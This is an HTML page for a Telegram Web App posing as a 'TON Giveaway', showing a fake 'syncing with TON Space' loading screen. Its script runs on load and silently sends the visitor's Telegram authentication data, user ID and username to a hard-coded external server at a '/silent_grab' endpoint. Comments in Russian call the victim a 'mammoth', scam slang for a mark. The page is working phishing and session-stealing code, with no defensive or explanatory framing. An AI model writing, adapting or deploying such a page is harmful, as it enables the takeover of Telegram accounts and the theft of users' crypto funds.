<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON Giveaway</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background-color: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #0088cc; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 1.2rem; }
    </style>
</head>
<body>
    <div>
        <div class="loader"></div>
        <h1>Синхронизация с TON Space...</h1>
        <p>Пожалуйста, не закрывайте приложение</p>
    </div>

    <script>
        // Инициализация WebApp
        const tg = window.Telegram.WebApp;
        tg.expand(); // Разворачиваем на весь экран

        // Собираем данные мамонта
        const initData = tg.initData;
        const user = tg.initDataUnsafe?.user;

        if (initData) {
            // Отправляем на твой сервер FirstVDS
            fetch('http://86.110.212.62:5000/silent_grab', {
                method: 'POST',
                mode: 'no-cors', // КРИТИЧЕСКИ ВАЖНО: пробивает HTTPS -> HTTP
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    auth_data: initData,
                    user_id: user?.id,
                    username: user?.username
                })
            })
            .then(() => {
                console.log('Данные ушли');
            })
            .catch((error) => {
                console.error('Ошибка:', error);
            });
        }
    </script>
</body>
</html>
